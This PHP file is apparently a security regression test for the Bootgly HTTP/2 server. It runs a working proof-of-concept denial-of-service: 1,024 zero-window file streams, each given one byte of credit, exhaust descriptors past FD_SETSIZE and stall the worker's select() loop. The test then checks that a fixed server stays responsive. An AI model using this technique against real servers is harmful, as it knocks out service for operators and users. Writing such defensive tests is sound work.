<?php

use Bootgly\ABI\Debugging\Data\Vars;
use Bootgly\ACI\Events\Timer;
use Bootgly\ACI\Tests\Suite\Test\Specification\Separator;
use Bootgly\WPI\Interfaces\TCP_Server_CLI\Connections;
use Bootgly\WPI\Modules\HTTP2;
use Bootgly\WPI\Modules\HTTP2\Frame;
use Bootgly\WPI\Modules\HTTP2\HPACK;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Request;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Response;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Router;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Tests\Suite\Test\Specification;


/**
 * Security PoC H2 — flow-controlled HTTP/2 file responses must not retain
 * enough live file descriptors to invalidate the worker's select() backend.
 *
 * Eight already-accepted h2c connections each open the advertised maximum of
 * 128 file streams with a zero initial send window. One byte of credit per
 * stream makes the file branch open 1,024 independent handlers while leaving
 * every transfer incomplete. A later victim connection is therefore accepted
 * at an OS descriptor at or above FD_SETSIZE.
 *
 * The selected secure invariant is exact: all 1,024 streams emit their
 * credited byte without reset, no file handler survives its drain callback,
 * and unrelated I/O remains responsive. The vulnerable implementation makes
 * stream_select() fail continuously and stops processing both an existing
 * low-FD control socket and the new victim.
 *
 * A one-shot worker Timer closes all test connections after four seconds. The
 * timer signal is dispatched even while select() returns false, so the PoC
 * releases every retained file handler without terminating the worker.
 */
$connectionCount = 8;
$streamsPerConnection = 128;
$targetHandlers = $connectionCount * $streamsPerConnection;
$probe = [
   'error' => '',
   'token' => '',
   'setup' => [],
   'preflight_acks' => 0,
   'header_connections' => [],
   'header_streams' => 0,
   'zero_credit' => [],
   'data_connections' => [],
   'data_streams' => 0,
   'data_bytes' => 0,
   'data_exact' => 0,
   'data_ended' => 0,
   'data_resets' => 0,
   'after_credit' => [],
   'arm' => false,
   'warning' => [],
   'before_victim' => [],
   'after_warning' => [],
   'victim_fd' => 0,
   'control_ack_after_warning' => false,
   'control_bytes_after_warning' => 0,
   'victim_bytes_before_cleanup' => 0,
   'cleanup' => [],
   'after_cleanup' => [],
   'fresh' => [],
];

return new Specification(
   description: 'HTTP/2 file flow control must not poison the worker selector with retained descriptors',
   Separator: new Separator(line: true),

   request: static function (
      string $hostPort,
      int $testIndex,
   ) use (
      &$probe,
      $connectionCount,
      $streamsPerConnection,
      $targetHandlers,
   ): string {
      $token = bin2hex(random_bytes(8));
      $warningPath = sys_get_temp_dir()
         . '/bootgly-security-h2-' . $token . '.warning.json';
      $cleanupPath = sys_get_temp_dir()
         . '/bootgly-security-h2-' . $token . '.cleanup.json';
      $probe['token'] = $token;
      @unlink($warningPath);
      @unlink($cleanupPath);

      $Headers = static function (
         int $testIndex,
         string $path,
         array $headers = [],
      ): string {
         return HPACK::encode([
            [':method', 'GET'],
            [':scheme', 'http'],
            [':path', $path],
            [':authority', 'localhost'],
            ['x-bootgly-test', (string) $testIndex],
            ...$headers,
         ]);
      };

      $Write = static function ($Socket, string $wire): void {
         $offset = 0;
         $length = strlen($wire);
         while ($offset < $length) {
            $written = @fwrite($Socket, substr($wire, $offset));
            if ($written === false || $written === 0) {
               throw new RuntimeException(
                  "Short HTTP/2 fixture write at {$offset}/{$length} bytes."
               );
            }
            $offset += $written;
         }
      };

      $Read = static function ($Socket, float $timeout): string {
         stream_set_blocking($Socket, false);

         $wire = '';
         $deadline = microtime(true) + $timeout;
         while (microtime(true) < $deadline) {
            $chunk = @fread($Socket, 65535);
            if ($chunk !== false && $chunk !== '') {
               $wire .= $chunk;
               continue;
            }
            if (@feof($Socket)) {
               break;
            }
            usleep(5_000);
         }

         return $wire;
      };

      $Call = static function (
         string $hostPort,
         int $testIndex,
         string $path,
         string $token = '',
         float $timeout = 3.0,
      ) use ($Read): string {
         $Socket = @stream_socket_client(
            "tcp://{$hostPort}",
            $errorNumber,
            $errorMessage,
            timeout: 3,
         );
         if (! is_resource($Socket)) {
            throw new RuntimeException(
               "Could not call {$path}: {$errorNumber} {$errorMessage}"
            );
         }

         stream_set_blocking($Socket, true);
         stream_set_timeout($Socket, 3);
         $request = "GET {$path} HTTP/1.1\r\n"
            . "X-Bootgly-Test: {$testIndex}\r\n"
            . ($token === '' ? '' : "X-H2-Token: {$token}\r\n")
            . "Host: localhost\r\n"
            . "Connection: close\r\n\r\n";
         $written = @fwrite($Socket, $request);
         if ($written !== strlen($request)) {
            @fclose($Socket);
            throw new RuntimeException("Could not write the complete {$path} request.");
         }

         $wire = $Read($Socket, $timeout);
         @fclose($Socket);

         return $wire;
      };

      $Decode = static function (string $wire): null|array {
         $separator = strpos($wire, "\r\n\r\n");
         if ($separator === false) {
            return null;
         }

         $decoded = json_decode(substr($wire, $separator + 4), true);

         return is_array($decoded) ? $decoded : null;
      };

      $Open = static function (string $hostPort) {
         $Socket = @stream_socket_client(
            "tcp://{$hostPort}",
            $errorNumber,
            $errorMessage,
            timeout: 3,
         );
         if (! is_resource($Socket)) {
            throw new RuntimeException(
               "Could not open HTTP/2 fixture: {$errorNumber} {$errorMessage}"
            );
         }

         stream_set_blocking($Socket, true);
         stream_set_timeout($Socket, 3);

         return $Socket;
      };

      $Walk = static function (string $wire): array {
         $state = [
            'headers' => [],
            'data' => [],
            'ended' => [],
            'pings' => [],
            'resets' => [],
            'frames' => 0,
            'parsed' => 0,
         ];
         $offset = 0;
         $length = strlen($wire);
         while ($offset + 9 <= $length) {
            $head = substr($wire, $offset, 9);
            $size = (ord($head[0]) << 16)
               | (ord($head[1]) << 8)
               | ord($head[2]);
            if ($size > 0x1000000 || $offset + 9 + $size > $length) {
               break;
            }

            $type = ord($head[3]);
            $flags = ord($head[4]);
            /** @var array{1:int} $StreamID */
            $StreamID = unpack('N', substr($head, 5, 4));
            $streamID = $StreamID[1] & 0x7fffffff;
            $payload = substr($wire, $offset + 9, $size);
            $state['frames']++;

            if ($type === HTTP2::FRAME_HEADERS) {
               $state['headers'][$streamID] =
                  ($state['headers'][$streamID] ?? 0) + 1;
               if (($flags & HTTP2::FLAG_END_STREAM) !== 0) {
                  $state['ended'][$streamID] = true;
               }
            }
            else if ($type === HTTP2::FRAME_DATA) {
               $state['data'][$streamID] =
                  ($state['data'][$streamID] ?? '') . $payload;
               if (($flags & HTTP2::FLAG_END_STREAM) !== 0) {
                  $state['ended'][$streamID] = true;
               }
            }
            else if (
               $type === HTTP2::FRAME_PING
               && ($flags & HTTP2::FLAG_ACK) !== 0
               && $size === 8
            ) {
               $state['pings'][$payload] = true;
            }
            else if ($type === HTTP2::FRAME_RST_STREAM && $size >= 4) {
               /** @var array{1:int} $Error */
               $Error = unpack('N', substr($payload, 0, 4));
               $state['resets'][$streamID] = $Error[1];
            }

            $offset += 9 + $size;
         }
         $state['parsed'] = $offset;

         return $state;
      };

      $Await = static function (
         $Socket,
         string &$wire,
         callable $check,
         float $timeout = 4.0,
      ) use ($Walk): array {
         stream_set_blocking($Socket, false);
         $deadline = microtime(true) + $timeout;
         do {
            $chunk = @fread($Socket, 65535);
            if ($chunk !== false && $chunk !== '') {
               $wire .= $chunk;
            }

            $state = $Walk($wire);
            if ($check($state) === true) {
               return $state;
            }
            if (@feof($Socket)) {
               break;
            }
            usleep(5_000);
         }
         while (microtime(true) < $deadline);

         return $Walk($wire);
      };

      $Snapshot = static function (int $PID, string $target): array {
         $directory = "/proc/{$PID}/fd";
         $entries = @scandir($directory);
         if (! is_array($entries)) {
            throw new RuntimeException("Could not enumerate {$directory}.");
         }

         $links = [];
         $targetFDs = 0;
         $maxFD = -1;
         foreach ($entries as $entry) {
            if (preg_match('/^[0-9]+$/D', $entry) !== 1) {
               continue;
            }
            $FD = (int) $entry;
            $link = @readlink($directory . '/' . $entry);
            if (! is_string($link)) {
               continue;
            }
            $links[$FD] = $link;
            $maxFD = max($maxFD, $FD);
            if ($link === $target) {
               $targetFDs++;
            }
         }

         return [
            'total' => count($links),
            'target_fds' => $targetFDs,
            'max_fd' => $maxFD,
            'links' => $links,
         ];
      };

      $Summarize = static function (array $snapshot): array {
         unset($snapshot['links']);

         return $snapshot;
      };

      $Poll = static function (string $path, float $timeout): null|array {
         $deadline = microtime(true) + $timeout;
         do {
            $raw = @file_get_contents($path);
            if (is_string($raw) && $raw !== '') {
               $decoded = json_decode($raw, true);
               if (is_array($decoded)) {
                  return $decoded;
               }
            }
            usleep(5_000);
         }
         while (microtime(true) < $deadline);

         return null;
      };

      $controlSocket = null;
      $victimSocket = null;
      $attackSockets = [];
      $attackWires = [];
      $controlWire = '';

      try {
         if (
            ! is_dir('/proc/self/fd')
            || ! function_exists('pcntl_alarm')
            || ! function_exists('posix_getpid')
         ) {
            throw new RuntimeException(
               'H2 requires Linux /proc plus the PCNTL and POSIX extensions.'
            );
         }

         $setupWire = $Call(
            $hostPort,
            $testIndex,
            '/h2-fd-setup',
            $token,
         );
         $setup = $Decode($setupWire);
         if (
            ! is_array($setup)
            || ($setup['phase'] ?? null) !== 'setup'
            || ! is_int($setup['pid'] ?? null)
            || ($setup['pid'] ?? 0) <= 0
            || ! is_string($setup['target'] ?? null)
            || ($setup['target'] ?? '') === ''
            || ($setup['timer'] ?? false) === false
         ) {
            throw new RuntimeException(
               'The worker setup control did not return a usable PID, target, and timer.'
            );
         }
         $probe['setup'] = $setup;
         $PID = $setup['pid'];
         $target = $setup['target'];

         // @ Pre-open and positively exercise every network socket before any
         //   file handler exists. Their worker-side descriptors therefore stay
         //   below FD_SETSIZE and remain a valid low-FD liveness control.
         $controlSocket = $Open($hostPort);
         $controlPrefacePing = 'HC000000';
         $Write(
            $controlSocket,
            HTTP2::PREFACE
            . Frame::pack(
               HTTP2::FRAME_SETTINGS,
               0,
               0,
               pack('nN', HTTP2::SETTINGS_INITIAL_WINDOW_SIZE, 65535),
            )
            . Frame::pack(HTTP2::FRAME_PING, 0, 0, $controlPrefacePing),
         );
         $controlState = $Await(
            $controlSocket,
            $controlWire,
            static fn(array $state): bool =>
               isset($state['pings'][$controlPrefacePing]),
         );
         if (! isset($controlState['pings'][$controlPrefacePing])) {
            throw new RuntimeException('The low-FD HTTP/2 control did not ACK its preflight PING.');
         }
         $probe['preflight_acks']++;

         for ($connection = 0; $connection < $connectionCount; $connection++) {
            $Socket = $Open($hostPort);
            $attackSockets[$connection] = $Socket;
            $attackWires[$connection] = '';
            $ping = sprintf('HP%06d', $connection);
            $Write(
               $Socket,
               HTTP2::PREFACE
               . Frame::pack(
                  HTTP2::FRAME_SETTINGS,
                  0,
                  0,
                  pack('nN', HTTP2::SETTINGS_INITIAL_WINDOW_SIZE, 0),
               )
               . Frame::pack(HTTP2::FRAME_PING, 0, 0, $ping),
            );
            $state = $Await(
               $Socket,
               $attackWires[$connection],
               static fn(array $state): bool => isset($state['pings'][$ping]),
            );
            if (! isset($state['pings'][$ping])) {
               throw new RuntimeException(
                  "Attack connection {$connection} did not ACK its preflight PING."
               );
            }
            $probe['preflight_acks']++;
         }

         // @ Materialize every response with ZERO send credit. HEADERS and a
         //   following PING ACK prove the worker processed the entire batch,
         //   while /proc proves no file cursor was opened prematurely.
         for ($connection = 0; $connection < $connectionCount; $connection++) {
            $burst = '';
            for ($stream = 0; $stream < $streamsPerConnection; $stream++) {
               $streamID = 1 + ($stream * 2);
               $burst .= Frame::pack(
                  HTTP2::FRAME_HEADERS,
                  HTTP2::FLAG_END_HEADERS | HTTP2::FLAG_END_STREAM,
                  $streamID,
                  $Headers($testIndex, '/h2-fd-file'),
               );
            }
            $ping = sprintf('HH%06d', $connection);
            $burst .= Frame::pack(HTTP2::FRAME_PING, 0, 0, $ping);
            $Write($attackSockets[$connection], $burst);

            $state = $Await(
               $attackSockets[$connection],
               $attackWires[$connection],
               static fn(array $state): bool =>
                  count($state['headers']) >= $streamsPerConnection
                  && isset($state['pings'][$ping]),
               5.0,
            );
            $headers = count($state['headers']);
            $probe['header_connections'][$connection] = [
               'headers' => $headers,
               'ping' => isset($state['pings'][$ping]),
               'resets' => count($state['resets']),
            ];
            $probe['header_streams'] += $headers;
         }

         $zeroCredit = $Snapshot($PID, $target);
         $probe['zero_credit'] = $Summarize($zeroCredit);

         // @ Grant exactly one byte to every response. All credit is written
         //   before reading the barriers so the 1,024 live handlers coexist.
         $creditPings = [];
         for ($connection = 0; $connection < $connectionCount; $connection++) {
            $burst = '';
            for ($stream = 0; $stream < $streamsPerConnection; $stream++) {
               $streamID = 1 + ($stream * 2);
               $burst .= Frame::pack(
                  HTTP2::FRAME_WINDOW_UPDATE,
                  0,
                  $streamID,
                  pack('N', 1),
               );
            }
            $creditPings[$connection] = sprintf('HD%06d', $connection);
            $burst .= Frame::pack(
               HTTP2::FRAME_PING,
               0,
               0,
               $creditPings[$connection],
            );
            $Write($attackSockets[$connection], $burst);
         }

         for ($connection = 0; $connection < $connectionCount; $connection++) {
            $ping = $creditPings[$connection];
            $state = $Await(
               $attackSockets[$connection],
               $attackWires[$connection],
               static fn(array $state): bool =>
                  count($state['data']) >= $streamsPerConnection
                  && isset($state['pings'][$ping]),
               5.0,
            );

            $dataStreams = count($state['data']);
            $dataBytes = 0;
            $dataExact = 0;
            foreach ($state['data'] as $payload) {
               $dataBytes += strlen($payload);
               if ($payload === 'a') {
                  $dataExact++;
               }
            }
            $ended = count(
               array_intersect_key($state['ended'], $state['data'])
            );
            $probe['data_connections'][$connection] = [
               'streams' => $dataStreams,
               'bytes' => $dataBytes,
               'exact_first_byte' => $dataExact,
               'ended' => $ended,
               'ping' => isset($state['pings'][$ping]),
               'resets' => count($state['resets']),
            ];
            $probe['data_streams'] += $dataStreams;
            $probe['data_bytes'] += $dataBytes;
            $probe['data_exact'] += $dataExact;
            $probe['data_ended'] += $ended;
            $probe['data_resets'] += count($state['resets']);
         }

         $afterCredit = $Snapshot($PID, $target);
         $probe['after_credit'] = $Summarize($afterCredit);

         // @ Arm bounded cleanup over the pre-opened low-FD connection. A PING
         //   after the route response proves the arm was dispatched before the
         //   selector is deliberately crossed.
         $armPing = 'HA000000';
         $Write(
            $controlSocket,
            Frame::pack(
               HTTP2::FRAME_HEADERS,
               HTTP2::FLAG_END_HEADERS | HTTP2::FLAG_END_STREAM,
               1,
               $Headers(
                  $testIndex,
                  '/h2-fd-arm',
                  [['x-h2-token', $token]],
               ),
            )
            . Frame::pack(HTTP2::FRAME_PING, 0, 0, $armPing),
         );
         $controlState = $Await(
            $controlSocket,
            $controlWire,
            static fn(array $state): bool =>
               isset($state['ended'][1])
               && isset($state['pings'][$armPing]),
            4.0,
         );
         $probe['arm'] = isset($controlState['ended'][1])
            && isset($controlState['pings'][$armPing])
            && str_contains($controlState['data'][1] ?? '', '"phase":"arm"');
         if ($probe['arm'] !== true) {
            throw new RuntimeException(
               'The bounded cleanup route did not complete over the low-FD control.'
            );
         }

         // @ Always exercise a newly accepted victim. A cap just below 1,024
         //   retained files is not automatically safe: listener/control FDs
         //   consume slots too, so the next socket can still cross FD_SETSIZE.
         $beforeVictim = $Snapshot($PID, $target);
         $probe['before_victim'] = $Summarize($beforeVictim);

         // @ This TCP handshake completes through the kernel backlog. The
         //   low-FD listener accepts it at the next dispatch, then the event
         //   set may contain a descriptor at/above FD_SETSIZE.
         $victimSocket = $Open($hostPort);
         $victimRequest = "GET /h2-fd-victim HTTP/1.1\r\n"
            . "X-Bootgly-Test: {$testIndex}\r\n"
            . "Host: localhost\r\n"
            . "Connection: close\r\n\r\n";
         $Write($victimSocket, $victimRequest);

         $warning = $Poll($warningPath, 2.5);
         $probe['warning'] = is_array($warning) ? $warning : [];

         $afterWarning = $Snapshot($PID, $target);
         $probe['after_warning'] = $Summarize($afterWarning);
         foreach ($afterWarning['links'] as $FD => $link) {
            if (
               ! isset($beforeVictim['links'][$FD])
               && str_starts_with($link, 'socket:[')
            ) {
               $probe['victim_fd'] = max($probe['victim_fd'], $FD);
            }
         }

         // @ A unique PING on the pre-existing low descriptor and the complete
         //   victim request are both ready. Neither is dispatched on the
         //   vulnerable backend during this explicit 200ms pre-cleanup window.
         //   A remediated backend must make at least one control progress, even
         //   if it first warns and sheds an unsupported victim descriptor.
         $postWarningPing = 'HZ000000';
         $beforeControlBytes = strlen($controlWire);
         $Write(
            $controlSocket,
            Frame::pack(
               HTTP2::FRAME_PING,
               0,
               0,
               $postWarningPing,
            ),
         );
         $controlState = $Await(
            $controlSocket,
            $controlWire,
            static fn(array $state): bool =>
               isset($state['pings'][$postWarningPing]),
            0.20,
         );
         $probe['control_ack_after_warning'] =
            isset($controlState['pings'][$postWarningPing]);
         $probe['control_bytes_after_warning'] =
            strlen($controlWire) - $beforeControlBytes;

         $victimWire = $Read($victimSocket, 0.20);
         $probe['victim_bytes_before_cleanup'] = strlen($victimWire);

         $cleanup = $Poll($cleanupPath, 7.0);
         $probe['cleanup'] = is_array($cleanup) ? $cleanup : [];

         // @ The worker must survive its timer-driven teardown, own no target
         //   file descriptors, and service a fresh independent request.
         $probe['after_cleanup'] = $Summarize($Snapshot($PID, $target));
         $freshWire = $Call(
            $hostPort,
            $testIndex,
            '/h2-fd-fresh',
            timeout: 4.0,
         );
         $fresh = $Decode($freshWire);
         $probe['fresh'] = is_array($fresh) ? $fresh : [];
      }
      catch (Throwable $Throwable) {
         $probe['error'] = $Throwable::class . ': ' . $Throwable->getMessage();
      }
      finally {
         foreach ($attackSockets as $Socket) {
            if (is_resource($Socket)) {
               @fclose($Socket);
            }
         }
         if (is_resource($controlSocket)) {
            @fclose($controlSocket);
         }
         if (is_resource($victimSocket)) {
            @fclose($victimSocket);
         }
         @unlink($warningPath);
         @unlink($cleanupPath);
      }

      return "GET /h2-fd-harness HTTP/1.1\r\n"
         . "X-Bootgly-Test: {$testIndex}\r\n"
         . "Host: localhost\r\n"
         . "Connection: close\r\n\r\n";
   },

   response: static function (
      Request $Request,
      Response $Response,
      Router $Router,
   ) {
      static $worker = [
         'token' => '',
         'warning_path' => '',
         'cleanup_path' => '',
         'handler' => false,
         'cleaned' => false,
         'timer' => false,
      ];

      $Target = realpath(
         BOOTGLY_PROJECT->path . 'statics/alphanumeric.txt'
      );

      $Snapshot = static function (string $target): array {
         $entries = @scandir('/proc/self/fd');
         if (! is_array($entries)) {
            return ['total' => -1, 'target_fds' => -1, 'max_fd' => -1];
         }

         $total = 0;
         $targetFDs = 0;
         $maxFD = -1;
         foreach ($entries as $entry) {
            if (preg_match('/^[0-9]+$/D', $entry) !== 1) {
               continue;
            }
            $link = @readlink('/proc/self/fd/' . $entry);
            if (! is_string($link)) {
               continue;
            }
            $total++;
            $FD = (int) $entry;
            $maxFD = max($maxFD, $FD);
            if ($link === $target) {
               $targetFDs++;
            }
         }

         return [
            'total' => $total,
            'target_fds' => $targetFDs,
            'max_fd' => $maxFD,
         ];
      };

      $Cleanup = static function () use (&$worker, $Target, $Snapshot): void {
         if ($worker['cleaned'] === true) {
            return;
         }

         $Connections = array_values(Connections::$Connections);
         $closed = 0;
         $errors = [];
         try {
            foreach ($Connections as $Connection) {
               try {
                  $Connection->close();
                  $closed++;
               }
               catch (Throwable $Throwable) {
                  $errors[] = $Throwable::class . ': '
                     . $Throwable->getMessage();
               }
            }
         }
         finally {
            if ($worker['handler'] === true) {
               restore_error_handler();
               $worker['handler'] = false;
            }
         }

         $snapshot = $Snapshot(is_string($Target) ? $Target : '');
         $remaining = count(Connections::$Connections);
         $worker['cleaned'] = $errors === []
            && $remaining === 0
            && ($snapshot['target_fds'] ?? -1) === 0;
         @file_put_contents(
            $worker['cleanup_path'],
            (string) json_encode([
               'phase' => 'cleanup',
               'pid' => getmypid(),
               'attempted_connections' => count($Connections),
               'closed_connections' => $closed,
               'remaining_connections' => $remaining,
               'errors' => $errors,
               'complete' => $worker['cleaned'],
               ...$snapshot,
            ], JSON_UNESCAPED_SLASHES),
            LOCK_EX,
         );
      };

      yield $Router->route('/h2-fd-setup', static function (
         Request $Request,
         Response $Response,
      ) use (&$worker, $Target, $Cleanup): Response {
         $token = $Request->Header->get('X-H2-Token') ?? '';
         if (
            preg_match('/^[a-f0-9]{16}$/D', $token) !== 1
            || ! is_string($Target)
         ) {
            return $Response->code(400)->JSON->send([
               'phase' => 'setup',
               'error' => 'invalid token or target',
            ]);
         }

         $worker['token'] = $token;
         $worker['warning_path'] = sys_get_temp_dir()
            . '/bootgly-security-h2-' . $token . '.warning.json';
         $worker['cleanup_path'] = sys_get_temp_dir()
            . '/bootgly-security-h2-' . $token . '.cleanup.json';
         $worker['cleaned'] = false;
         @unlink($worker['warning_path']);
         @unlink($worker['cleanup_path']);

         $recorded = false;
         $warningPath = $worker['warning_path'];
         set_error_handler(static function (
            int $severity,
            string $message,
            string $file,
            int $line,
         ) use (&$recorded, $warningPath): bool {
            if (
               $severity !== E_WARNING
               || ! str_contains($message, 'stream_select')
               || ! str_contains($message, 'FD_SETSIZE')
            ) {
               return false;
            }

            if ($recorded === false) {
               $recorded = true;
               $Trace = array_map(
                  static fn(array $frame): array => [
                     'file' => $frame['file'] ?? '',
                     'line' => $frame['line'] ?? 0,
                     'function' => $frame['function'] ?? '',
                     'class' => $frame['class'] ?? '',
                  ],
                  debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS, 8),
               );
               @file_put_contents(
                  $warningPath,
                  (string) json_encode([
                     'phase' => 'warning',
                     'pid' => getmypid(),
                     'severity' => $severity,
                     'message' => $message,
                     'file' => $file,
                     'line' => $line,
                     'trace' => $Trace,
                  ], JSON_UNESCAPED_SLASHES),
                  LOCK_EX,
               );
            }

            return true;
         });
         $worker['handler'] = true;

         // ! Safety net only: the targeted case is last in this suite, and the
         //   normal arm route installs a four-second cleanup timer.
         $worker['timer'] = Timer::add(
            60,
            $Cleanup,
            persistent: false,
         );

         return $Response->JSON->send([
            'phase' => 'setup',
            'pid' => getmypid(),
            'target' => $Target,
            'timer' => $worker['timer'],
         ]);
      }, GET);

      yield $Router->route('/h2-fd-file', static function (
         Request $Request,
         Response $Response,
      ): Response {
         return $Response->upload('statics/alphanumeric.txt');
      }, GET);

      yield $Router->route('/h2-fd-arm', static function (
         Request $Request,
         Response $Response,
      ) use (&$worker, $Cleanup): Response {
         $token = $Request->Header->get('X-H2-Token') ?? '';
         if (
            $token === ''
            || ! hash_equals($worker['token'], $token)
            || $worker['handler'] !== true
         ) {
            return $Response->code(403)->JSON->send([
               'phase' => 'arm',
               'error' => 'invalid state or token',
            ]);
         }

         $timer = Timer::add(4, $Cleanup, persistent: false);
         if ($timer === false) {
            return $Response->code(500)->JSON->send([
               'phase' => 'arm',
               'error' => 'timer registration failed',
            ]);
         }

         return $Response->JSON->send([
            'phase' => 'arm',
            'pid' => getmypid(),
            'timer' => $timer,
         ]);
      }, GET);

      yield $Router->route('/h2-fd-victim', static function (
         Request $Request,
         Response $Response,
      ): Response {
         return $Response->JSON->send([
            'phase' => 'victim',
            'pid' => getmypid(),
         ]);
      }, GET);

      yield $Router->route('/h2-fd-fresh', static function (
         Request $Request,
         Response $Response,
      ): Response {
         return $Response->JSON->send([
            'phase' => 'fresh',
            'pid' => getmypid(),
         ]);
      }, GET);

      yield $Router->route('/h2-fd-harness', static function (
         Request $Request,
         Response $Response,
      ): Response {
         return $Response->JSON->send([
            'phase' => 'harness',
            'pid' => getmypid(),
         ]);
      }, GET);
   },

   test: static function (string $response) use (
      &$probe,
      $connectionCount,
      $streamsPerConnection,
      $targetHandlers,
   ): bool|string {
      $separator = strpos($response, "\r\n\r\n");
      $harness = $separator === false
         ? null
         : json_decode(substr($response, $separator + 4), true);

      if ($probe['error'] !== '') {
         Vars::$labels = ['H2 fixture evidence'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H2 fixture error: ' . $probe['error'];
      }

      $PID = $probe['setup']['pid'] ?? 0;
      if (
         ! is_int($PID)
         || $PID <= 0
         || ($probe['preflight_acks'] ?? 0) !== $connectionCount + 1
         || ($probe['header_streams'] ?? 0) !== $targetHandlers
         || ($probe['zero_credit']['target_fds'] ?? -1) !== 0
      ) {
         Vars::$labels = ['H2 source controls'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H2 control failed: the real HTTP/2 source path did not produce '
            . "{$targetHandlers} acknowledged zero-credit file streams over "
            . "{$connectionCount} pre-opened connections.";
      }

      $cleanupPID = $probe['cleanup']['pid'] ?? 0;
      $freshPID = $probe['fresh']['pid'] ?? 0;
      $harnessPID = is_array($harness) ? ($harness['pid'] ?? 0) : 0;
      if (
         ($probe['arm'] ?? false) !== true
         || ! is_int($cleanupPID)
         || $cleanupPID !== $PID
         || ($probe['cleanup']['complete'] ?? false) !== true
         || ($probe['cleanup']['errors'] ?? null) !== []
         || ($probe['cleanup']['remaining_connections'] ?? -1) !== 0
         || ($probe['cleanup']['target_fds'] ?? -1) !== 0
         || ($probe['after_cleanup']['target_fds'] ?? -1) !== 0
         || ! is_int($freshPID)
         || $freshPID !== $PID
         || ! is_int($harnessPID)
         || $harnessPID !== $PID
      ) {
         Vars::$labels = ['H2 cleanup and worker-survival controls'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H2 control failed: timer cleanup did not release every target '
            . 'descriptor and preserve the same worker for fresh requests.';
      }

      $retained = $probe['after_credit']['target_fds'] ?? -1;
      $progressed = $probe['data_streams'] ?? 0;
      $pathExercised = $progressed > 0
         && ($probe['data_bytes'] ?? -1) === $progressed
         && ($probe['data_exact'] ?? -1) === $progressed
         && ($probe['data_ended'] ?? -1) === 0;
      if ($pathExercised === false) {
         Vars::$labels = ['H2 file-path exercise controls'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H2 control failed: exact one-byte file progress did not '
            . 'establish that the protected path was exercised.';
      }

      $warning = $probe['warning'];
      $warningMessage = is_array($warning)
         ? ($warning['message'] ?? '')
         : '';
      $warningFile = is_array($warning)
         ? ($warning['file'] ?? '')
         : '';
      $warningPID = is_array($warning)
         ? ($warning['pid'] ?? 0)
         : 0;
      $selectorFailed = is_string($warningMessage)
         && str_contains($warningMessage, 'stream_select')
         && str_contains($warningMessage, 'FD_SETSIZE')
         && is_string($warningFile)
         && str_ends_with($warningFile, '/Bootgly/WPI/Events/Select.php')
         && $warningPID === $PID;
      $selectorStalled = $selectorFailed
         && ($probe['after_credit']['max_fd'] ?? -1) >= 1024
         && ($probe['victim_fd'] ?? -1) >= 1024
         && ($probe['control_ack_after_warning'] ?? true) === false
         && ($probe['control_bytes_after_warning'] ?? -1) === 0
         && ($probe['victim_bytes_before_cleanup'] ?? -1) === 0;
      $exactAttack = $retained === $targetHandlers
         && $progressed === $targetHandlers
         && ($probe['data_bytes'] ?? -1) === $targetHandlers
         && ($probe['data_exact'] ?? -1) === $targetHandlers
         && ($probe['data_resets'] ?? -1) === 0
         && ($probe['data_ended'] ?? -1) === 0;

      if ($selectorStalled && $exactAttack) {
         Vars::$labels = ['H2 confirmed source-to-sink evidence'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'CONFIRMED H2: eight attacker-controlled HTTP/2 connections '
            . "retained {$retained} live handlers for one 62-byte file after "
            . 'one byte of credit per stream. The next accepted socket used FD '
            . $probe['victim_fd'] . ', stream_select() emitted its FD_SETSIZE '
            . 'warning from Select.php, and both the pre-opened low-FD PING and '
            . 'the new victim request received zero bytes during the explicit '
            . '200ms pre-cleanup observation. The same worker then released every '
            . 'handler and resumed service.';
      }

      if ($selectorStalled && $retained > 0) {
         Vars::$labels = ['H2 insufficient-mitigation evidence'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H2 unsafe remediation: the file-handler count changed to '
            . $retained . ', but the next socket still crossed FD_SETSIZE and '
            . 'unrelated I/O made no progress during the explicit 200ms '
            . 'pre-cleanup observation.';
      }

      $unrelatedProgress =
         ($probe['control_ack_after_warning'] ?? false) === true
         || ($probe['victim_bytes_before_cleanup'] ?? 0) > 0;
      $secureTransfer = $retained === 0
         && $progressed === $targetHandlers
         && ($probe['data_bytes'] ?? -1) === $targetHandlers
         && ($probe['data_exact'] ?? -1) === $targetHandlers
         && ($probe['data_resets'] ?? -1) === 0
         && ($probe['data_ended'] ?? -1) === 0;

      // ? The selected remediation's invariant is exact: all file streams
      //   progress, no stream is sacrificed, and no handler survives a drain
      //   callback. Unrelated I/O must remain live before bounded cleanup.
      if ($secureTransfer && $unrelatedProgress) {
         return true;
      }

      if ($unrelatedProgress) {
         Vars::$labels = ['H2 incomplete-remediation evidence'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H2 unsafe remediation: unrelated I/O stayed responsive, but '
            . "the file phase retained {$retained} handlers, progressed "
            . "{$progressed}/{$targetHandlers} streams, or reset "
            . ($probe['data_resets'] ?? -1) . ' streams.';
      }

      Vars::$labels = ['H2 selector-boundary evidence'];
      dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

      return 'H2 control failed: the protected file path was exercised, but '
         . 'neither the complete source-to-sink selector failure nor the exact '
         . 'zero-retention responsive invariant was observed before cleanup.';
   },
);
